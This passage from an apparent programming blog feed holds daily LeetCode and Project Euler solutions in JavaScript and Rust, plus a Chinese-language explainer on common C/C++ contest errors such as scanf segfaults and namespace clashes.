class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; N</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; K</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> numsSameConsecDiff = <span class="function"><span class="keyword">function</span>(<span class="params">N, K</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ans = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line">  <span class="keyword">if</span> (N === <span class="number">1</span>) &#123;</span><br><span class="line">    ans.push(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> cnt = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (cnt &lt; N) &#123;</span><br><span class="line">    cnt += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> sz = ans.length;</span><br><span class="line">    <span class="keyword">while</span> (sz) &#123;</span><br><span class="line">     sz -= <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">let</span> cur = ans.shift();</span><br><span class="line">     <span class="keyword">if</span> (cur%<span class="number">10</span> - K &gt;= <span class="number">0</span>) ans.push(cur*<span class="number">10</span> + cur%<span class="number">10</span> - K);</span><br><span class="line">     <span class="keyword">if</span> (K !== <span class="number">0</span> &amp;&amp; cur%<span class="number">10</span> + K &lt;= <span class="number">9</span>) ans.push(cur*<span class="number">10</span> + cur%<span class="number">10</span> + K);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(numsSameConsecDiff(<span class="number">2</span>,<span class="number">1</span>));</span><br><span class="line"><span class="built_in">console</span>.log(numsSameConsecDiff(<span class="number">3</span>,<span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; N</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; K</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> numsSameConsecDiff = <span class="function"><span class="keyword">function</span>(<span class="params">N, K</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ans = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line">  <span class="keyword">if</span> (N === <span class="number">1</span>) &#123;</span><br><span class="line">    ans.push(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (K === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i) &#123;</span><br><span class="line">      <span class="keyword">let</span> cur = <span class="string">""</span> + ans.shift();</span><br><span class="line">      ans.push(+(cur.repeat(N)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> cnt = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (cnt &lt; N) &#123;</span><br><span class="line">    cnt += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> sz = ans.length;</span><br><span class="line">    <span class="keyword">while</span> (sz) &#123;</span><br><span class="line">      sz -= <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">let</span> cur = ans.shift();</span><br><span class="line">      <span class="keyword">if</span> (cur%<span class="number">10</span> - K &gt;= <span class="number">0</span>) ans.push(cur*<span class="number">10</span> + cur%<span class="number">10</span> - K);</span><br><span class="line">      <span class="keyword">if</span> (cur%<span class="number">10</span> + K &lt;= <span class="number">9</span>) ans.push(cur*<span class="number">10</span> + cur%<span class="number">10</span> + K);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-31 Daily Challenge</title>
      <link href="/2019-01-31-Daily-Challenge/"/>
      <url>/2019-01-31-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Coded triangle numbers</em> in <em>Rust</em> and <em>Minimum Height Trees</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Coded-triangle-numbers"><a href="#Coded-triangle-numbers" class="headerlink" title="Coded triangle numbers"></a>Coded triangle numbers</h3><h3 id="Problem-42"><a href="#Problem-42" class="headerlink" title="Problem 42"></a>Problem 42</h3><p>The <em>n</em>th term of the sequence of triangle numbers is given by, <em>tn</em> = ½<em>n</em>(<em>n</em>+1); so the first ten triangle numbers are:</p><p>1, 3, 6, 10, 15, 21, 28, 36, 45, 55, ...</p><p>By converting each letter in a word to a number corresponding to its alphabetical position and adding these values we form a word value. For example, the word value for SKY is 19 + 11 + 25 = 55 = <em>t</em>10. If the word value is a triangle number then we shall call the word a triangle word.</p><p>Using <a href="https://projecteuler.net/project/resources/p042_words.txt" target="_blank" rel="noopener">words.txt</a> (right click and &#39;Save Link/Target As...&#39;), a 16K text file containing nearly two-thousand common English words, how many are triangle words?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashSet;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> words = [<span class="string">"A"</span>, <span class="string">"ABILITY"</span>, <span class="string">"ABLE"</span>, <span class="string">"ABOUT"</span>, <span class="string">"ABOVE"</span>, <span class="string">"ABSENCE"</span>, <span class="string">"ABSOLUTELY"</span>, <span class="string">"ACADEMIC"</span>,</span><br><span class="line"><span class="string">"ACCEPT"</span>, <span class="string">"ACCESS"</span>, <span class="string">"ACCIDENT"</span>, <span class="string">"ACCOMPANY"</span>, <span class="string">"ACCORDING"</span>, <span class="string">"ACCOUNT"</span>, <span class="string">"ACHIEVE"</span>, <span class="string">"ACHIEVEMENT"</span>,</span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"><span class="string">"YEAH"</span>, <span class="string">"YEAR"</span>, <span class="string">"YES"</span>, <span class="string">"YESTERDAY"</span>, <span class="string">"YET"</span>, <span class="string">"YOU"</span>, <span class="string">"YOUNG"</span>, <span class="string">"YOUR"</span>,</span><br><span class="line"><span class="string">"YOURSELF"</span>, <span class="string">"YOUTH"</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> set = HashSet::new();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = HashSet::new();</span><br><span class="line">    <span class="keyword">const</span> OFFSET: <span class="built_in">usize</span> = <span class="string">'A'</span> <span class="keyword">as</span> <span class="built_in">usize</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">20</span> &#123;</span><br><span class="line">        set.insert(i*(i+<span class="number">1</span>)/<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> words.iter() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> word.chars() &#123;</span><br><span class="line">            tmp += (c <span class="keyword">as</span> <span class="built_in">usize</span>) - OFFSET;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> set.contains(&amp;tmp) &#123;</span><br><span class="line">            ans.insert(word);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans.len());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="310-Minimum-Height-Trees"><a href="#310-Minimum-Height-Trees" class="headerlink" title="310. Minimum Height Trees"></a>310. Minimum Height Trees</h3><p>Medium</p><p>For an undirected graph with tree characteristics, we can choose any node as the root. The result graph is then a rooted tree. Among all possible rooted trees, those with minimum height are called minimum height trees (MHTs). Given such a graph, write a function to find all the MHTs and return a list of their root labels.</p><p><strong>Format</strong><br>The graph contains <code>n</code> nodes which are labeled from <code>0</code> to <code>n - 1</code>. You will be given the number <code>n</code> and a list of undirected <code>edges</code>(each edge is a pair of labels).</p><p>You can assume that no duplicate edges will appear in <code>edges</code>. Since all edges are undirected, <code>[0, 1]</code> is the same as <code>[1, 0]</code>and thus will not appear together in <code>edges</code>.</p><p><strong>Example 1 :</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 4, edges = [[1, 0], [1, 2], [1, 3]]</span><br><span class="line"></span><br><span class="line">        0</span><br><span class="line">        |</span><br><span class="line">        1</span><br><span class="line">       / \</span><br><span class="line">      2   3 </span><br><span class="line"></span><br><span class="line">Output: [1]</span><br></pre></td></tr></table></figure><p><strong>Example 2 :</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 6, edges = [[0, 3], [1, 3], [2, 3], [4, 3], [5, 4]]</span><br><span class="line"></span><br><span class="line">     0  1  2</span><br><span class="line">      \ | /</span><br><span class="line">        3</span><br><span class="line">        |</span><br><span class="line">        4</span><br><span class="line">        |</span><br><span class="line">        5 </span><br><span class="line"></span><br><span class="line">Output: [3, 4]</span><br></pre></td></tr></table></figure><p><strong>Note</strong>:</p><ul><li>According to the <a href="https://en.wikipedia.org/wiki/Tree_(graph_theory" target="_blank" rel="noopener">definition of tree on Wikipedia</a>): “a tree is an undirected graph in which any two vertices are connected by <em>exactly</em> one path. In other words, any connected graph without simple cycles is a tree.”</li><li>The height of a rooted tree is the number of edges on the longest downward path between the root and a leaf.</li></ul><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Image that if we take all leaf nodes, then the tree will be smaller, and there comes new leaf nodes, over and over again, until all nodes can be leaves, then there are our roots.</p><p>Use topological sort can solve it.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; n</span></span><br><span class="line"><span class="comment"> * @param &#123;number[][]&#125; edges</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> findMinHeightTrees = <span class="function"><span class="keyword">function</span>(<span class="params">n, edges</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> [<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">let</span> G = [];</span><br><span class="line">  <span class="keyword">let</span> degree = <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    G.push([]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> edge <span class="keyword">of</span> edges) &#123;</span><br><span class="line">    G[edge[<span class="number">0</span>]].push(edge[<span class="number">1</span>]);</span><br><span class="line">    G[edge[<span class="number">1</span>]].push(edge[<span class="number">0</span>]);</span><br><span class="line">    ++degree[edge[<span class="number">0</span>]];</span><br><span class="line">    ++degree[edge[<span class="number">1</span>]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> queue = [];</span><br><span class="line">  <span class="keyword">let</span> rmcnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (degree[i] === <span class="number">1</span>) &#123;</span><br><span class="line">      queue.push(i);</span><br><span class="line">      ++rmcnt;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (rmcnt &lt; n) &#123;</span><br><span class="line">    <span class="keyword">let</span> cnt = queue.length;</span><br><span class="line">    <span class="keyword">while</span> (cnt) &#123;</span><br><span class="line">      --cnt;</span><br><span class="line">      <span class="keyword">let</span> cur = queue.shift();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> i <span class="keyword">of</span> G[cur]) &#123;</span><br><span class="line">        --degree[i];</span><br><span class="line">        <span class="keyword">if</span> (degree[i] === <span class="number">1</span>) &#123;</span><br><span class="line">          queue.push(i);</span><br><span class="line">          ++rmcnt;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> queue;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2019-01-31-Daily-Challenge/4.png" title="ha">]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ACM中一些常见的问题及原因</title>
      <link href="/ACM%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E5%8E%9F%E5%9B%A0/"/>
      <url>/ACM%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E5%8E%9F%E5%9B%A0/</url>
      <content type="html"><![CDATA[<p>最近在 ACM 群灌水，顺便解决了一点问题，感觉可能会成为日经系列，寻思可以写个博文专门写写，正好也是对自己学习知识的检验。</p><p>我觉得这篇文章阅读方式可以按照《C语言常见问题集》，遇到问题了来看看也行，电脑阅读的时候右边应该会有个目录可以跳转，顺着读一遍也行。</p><p>文章只能慢慢更新，因为我并不想随意地对待这种难得的问题，然而工作在身并不能全身心投入。</p><p>以下内容如无特殊声明，采用C99和C++11标准。</p><a id="more"></a><h1 id="为什么在读入的时候不加-amp-经常会-RE，但是数组名不加-amp-就没问题？"><a href="#为什么在读入的时候不加-amp-经常会-RE，但是数组名不加-amp-就没问题？" class="headerlink" title="为什么在读入的时候不加&amp;经常会 RE，但是数组名不加&amp;就没问题？"></a>为什么在读入的时候不加&amp;经常会 RE，但是数组名不加&amp;就没问题？</h1><p>这里让我们先到scanf的<a href="http://man7.org/linux/man-pages/man3/scanf.3.html" target="_blank" rel="noopener">manual page</a>看看描述。</p><p>这里我把关键的两段截出来，其他部分对这个问题帮助不大所以就自己看了。重点看加粗部分</p><blockquote><pre><code>The scanf() family of functions scans input according to *format* asdescribed below.  This format may contain *conversion specifications*;the results from such conversions, **if any, are stored in thelocations pointed to by the *pointer* arguments that follow format**.Each pointer argument must be of a type that is appropriate for thevalue returned by the corresponding conversion specification.**If the number of conversion specifications in format exceeds thenumber of pointer arguments, the results are undefined.  If thenumber of pointer arguments exceeds the number of conversionspecifications, then the excess pointer arguments are evaluated, butare otherwise ignored.**</code></pre></blockquote><p>这里format指的是<a href="https://en.wikipedia.org/wiki/Printf_format_string" target="_blank" rel="noopener">格式化字符串</a>，简单来说就是printf/printf的第一个参数，fscanf/fprintf的第二个参数，而这个字符串里的conversion specifications（中文维基直译为转换说明）就是指指定类型的那个e/p/d/x，比如%d中的d。同时从这里可能也就能理解为什么要叫printf/scanf而不叫print/scan，因为这是print format/scan format的简写。顺便一提，格式化字符串还是一类漏洞的名称，有兴趣的话不妨搜索了解一下。</p><p>然后回到话题，看到第一处加粗的文字，也就是说，若里面有类似%d这样的参数，而且也有对应的参数（比如<code>scanf(&quot;%d&quot;, a)；</code>里的a就是%d对应的参数）scanf会按照格式读入数据（并将其转化为二进制表示），然后存入对应<strong>指针</strong>参数指向的地址。也就是说它把后面的参数认为是指针了。</p><p>也就是说，下面这两个代码在某个层面上来说，意思是一样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a, tmp;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;tmp);</span><br><span class="line">*(<span class="keyword">int</span>*)a = tmp;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行的结果基本是<code>Segmentation fault (core dumped)</code>。</p><p>这里C语言熟练的朋友就知道，局部自动(auto)变量定义时候不会隐式初始化，所以a的值是不确定的，把它直接给scanf用的结果大抵相当于向野指针指的地方写数据。所以段错误什么的很正常吧，</p><p>这里我们再进一步，做一个测试，首先我们改写程序，其次用系统工具查看一下系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">char</span> *st = <span class="string">"%d"</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p"</span>, st);</span><br><span class="line"><span class="built_in">scanf</span>(st, a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Z:/ACM_post# python -c &quot;print &apos;1234&apos;&quot; | ltrace ./a.out</span><br><span class="line"></span><br><span class="line">printf(&quot;%p&quot;, 0x7fff)                                                    = 6</span><br><span class="line">printf(&quot;%p&quot;, 0x7f027c6e3004)                                            = 14</span><br><span class="line">__isoc99_scanf(0x7f027c6e3004, 0x7fff, 0x7fff, 0 &lt;no return ...&gt;</span><br><span class="line">--- SIGSEGV (Segmentation fault) ---</span><br><span class="line">+++ killed by SIGSEGV +++</span><br></pre></td></tr></table></figure><p>唔嗯，这里我们就可以看到，a的初始值为0x7fff，最后这个值也出现在了scanf的底层调用——<code>__isoc99_scanf</code>里了。</p><p>那么为什么数组名又可以了呢？</p><blockquote><p>因为数组名是常量指针。</p></blockquote><p>肯定有认真听课的这样回答，但是很遗憾，不是的。数组名不是指针，但是它的确被转换成了指针。具体的内容可以搜索《说出来你们可能不信，但是数组名确实不是指针常量》。但是这个东西并不太重要，如果不当语言律师也没打算深度搞C，也没有必要理解。</p><h1 id="在函数里开不了大数组吗？"><a href="#在函数里开不了大数组吗？" class="headerlink" title="在函数里开不了大数组吗？"></a>在函数里开不了大数组吗？</h1><h1 id="我开了一个很大的全局数组，但是编译无法通过，这是为什么？"><a href="#我开了一个很大的全局数组，但是编译无法通过，这是为什么？" class="headerlink" title="我开了一个很大的全局数组，但是编译无法通过，这是为什么？"></a>我开了一个很大的全局数组，但是编译无法通过，这是为什么？</h1><h1 id="为什么越界会导致-RE？为什么有时候越界不会-RE-但是会-TLE-WA？"><a href="#为什么越界会导致-RE？为什么有时候越界不会-RE-但是会-TLE-WA？" class="headerlink" title="为什么越界会导致 RE？为什么有时候越界不会 RE 但是会 TLE/WA？"></a>为什么越界会导致 RE？为什么有时候越界不会 RE 但是会 TLE/WA？</h1><h1 id="我只定义过一个-left，为什么编译器告诉我-Error-reference-to-39-left-39-is-ambiguous？"><a href="#我只定义过一个-left，为什么编译器告诉我-Error-reference-to-39-left-39-is-ambiguous？" class="headerlink" title="我只定义过一个 left，为什么编译器告诉我[Error] reference to &#39;left&#39; is ambiguous？"></a>我只定义过一个 left，为什么编译器告诉我<code>[Error] reference to &#39;left&#39; is ambiguous</code>？</h1><p>如果你仔细查看报错信息，应该会看到类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9163&#123;PATH&#125;[Note] std::ios_base&amp; std::left(std::ios_base&amp;)</span><br></pre></td></tr></table></figure><p>出现这种问题是因为引入的头文件中的变量，比如left这个是在<code>bits/ios_base.h</code>里，而<code>algorithm</code>里有count这样的函数。</p><p>这些变量通常都在有两种方法可以解决，一是不要使用<code>using namespace std;</code>这个语句，另一个是不要用类似<code>left</code>, <code>count</code>这样的名称。从工程角度来说，第一个做法是比较合理的。</p><h1 id="我这样写有问题吗？为什么读入会失败？（关于整数的读入）"><a href="#我这样写有问题吗？为什么读入会失败？（关于整数的读入）" class="headerlink" title="我这样写有问题吗？为什么读入会失败？（关于整数的读入）"></a>我这样写有问题吗？为什么读入会失败？（关于整数的读入）</h1><h1 id="你总是说的堆栈，是指什么？"><a href="#你总是说的堆栈，是指什么？" class="headerlink" title="你总是说的堆栈，是指什么？"></a>你总是说的堆栈，是指什么？</h1><p>首先需要了解一些前置知识，这些前置知识能在《计算机组成原理》《操作系统》这样的书籍里找到，这里仅作简单地补充。</p>]]></content>
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-30 Daily Challenge</title>
      <link href="/2019-01-30-Daily-Challenge/"/>
      <url>/2019-01-30-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Pandigital prime</em> in <em>Rust</em> and <em>Repeated DNA Sequences</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Pandigital-prime"><a href="#Pandigital-prime" class="headerlink" title="Pandigital prime"></a>Pandigital prime</h3><h3 id="Problem-41"><a href="#Problem-41" class="headerlink" title="Problem 41"></a>Problem 41</h3><p>We shall say that an <em>n</em>-digit number is pandigital if it makes use of all the digits 1 to <em>n</em> exactly once. For example, 2143 is a 4-digit pandigital and is also prime.</p><p>What is the largest <em>n</em>-digit pandigital prime that exists?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>So many pandigital problems...</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::StreamingSieve;</span><br><span class="line"><span class="keyword">use</span> primal::Primes;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> up_bd = StreamingSieve::prime_pi(<span class="number">1_000_000_000usize</span>);</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> 